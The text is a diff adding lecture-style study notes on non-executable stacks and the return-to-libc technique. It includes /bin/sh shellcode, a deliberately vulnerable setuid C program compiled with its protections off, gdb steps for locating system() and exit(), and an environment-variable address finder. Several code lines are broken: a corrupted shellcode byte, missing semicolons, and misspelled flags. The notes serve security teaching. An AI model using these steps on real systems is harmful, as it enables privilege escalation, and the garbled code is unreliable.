@@ -1,0 +1,142 @@
+- Concept
+    - Stack is primarily used for data storage
+    - Rarely do we execute code from the stack.
+    - Stack of most programs do not need to be executable.
+    - Consider the following
+        /* shellcode.c */
+        #include <string.h>
+
+        const char code[] = 
+            "\x31\xc0\x50\x68//sh\x68/bin"
+            "\x89\xe3\x50\x5389\xe1\x99"
+            "\xb0\x0b\xcd\x80"
+
+        int main (int argc, char **argv){
+            char buffer [sizeof(code)];
+            strcpy(buffer, code);
+            ((void(*) ( ))buffer)();
+        }
+    - Let us compile the code with and withour "non-executable stack"
+        $ gcc -z execstack shellcode.c
+        $ a.out
+        # <<< Got a shell 
+        
+        $ gcc -z non-execstack shellcode.c
+        $ a.out
+        $ Segmentation fault
+        - This countermeasure will block any code from being executed
+        from the stack
+    - Defeating this countermeasure
+        - For buffer overflow to succeed, some code need to be executed
+        whether that code is in the stack or not does not matter.
+        - Given an attacker can not run a code on the stack 
+            - the attacker have to find some code in the memory 
+            already.
+            - And luckly there is already in the memory plenty 
+            of code in the library such as libc which is a dynamic
+            link library
+            - The question now becomes there is a libc function that we
+            can use to achive our maliciuos goal.
+                - If there is one we can get our our vulnerable program
+                to jump to this libc function
+                - Several such function exist for this purpose and the
+                easiest is system()
+                    - System() 
+                        - Takes as an argument string
+                        - Treats the string as command
+                        - Execute the command
+            - After the overflow buffer
+                - We can simply jump to the system function 
+                - Then ask it to run the "/bin/sh"
+            - This kind of attack is called return-to-libc
+- Consider the following program
+    /* stack.c */
+    #include <string.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+
+    void foo(char *str)
+    {
+        char buffer[100];
+        strcpy(buffer, str);
+    }
+
+    int main()
+    {
+        char str[400];
+        FILE *badfile;
+
+        badfile = fopen("badfile", "r");
+        fread(str, sizeof(char), 300, badfile);
+        foo(str);
+
+        printf("Finished");
+        return 1;
+    }
+
+    - Compilation and countermeasure
+        $ gcc -fno-stack-protector -z noexecstack -o stack stack.c
+        $ sudo sysctl -w kernel.radomize_va_space=0
+
+        $ sudo chown root stack
+        $ sudo chmod 4755 stack
+
+- Finding the address of the system
+    $ touch badfile
+    $ gdb -q stack
+    (gdb) run 
+    (gdb) p system
+    $1 = ..... 0xb7e4f430 <system>
+    (gdb) p exit
+    $1 = ..... 0xb7ec1450 <exit>
+    (gdb) quit
+
+- Finding the address of "/bin/sh"
+    - "/bin/sh" must be in memory and its address should be passed to 
+    system() function
+    - To place "/bin/sh" in the stack.c
+        - When overflowing the buffer we can place it somewhere in the 
+        buffer and find its address
+        - Or place it in the environment variable and find its address
+    - To use the second approch
+        - First develop the program to retrive the address of the
+        environment variable required
+            /* envaddr.c */
+            #include <stdio.h>
+
+            int main()
+            {
+                char *shell = (char *) getenv("MYSHELL");
+
+                if(shell) {
+                    printf(" Value : %s \n", shell);
+                    printf(" Address : %x \n", (unsigned int) shell)
+                }
+            }
+        - Create the environment variable
+            $ export MYSHELL="/bin/sh"
+        - Compile and run
+            $ gcc envaddr.c -o env55
+            $ ./env55
+                Value : /bin/sh
+                Address : bffffe8c
+
+            - As an adventure, change the name of of the executable
+                $ gcc envaddr.c -o env7777
+                $ ./env7777
+                    Value : /bin/sh
+                    Address : bffffe88
+                - NB the address of environment variable is sensitive to
+                the program name.
+                - Environment variables are stored in the stack 
+                region of a process
+                - But pefore environment are pushed the program name is pushed 
+                first.
+                - Therefore the length of the name affect memory location 
+                of environment variable.
+        
+
+
+
+
+
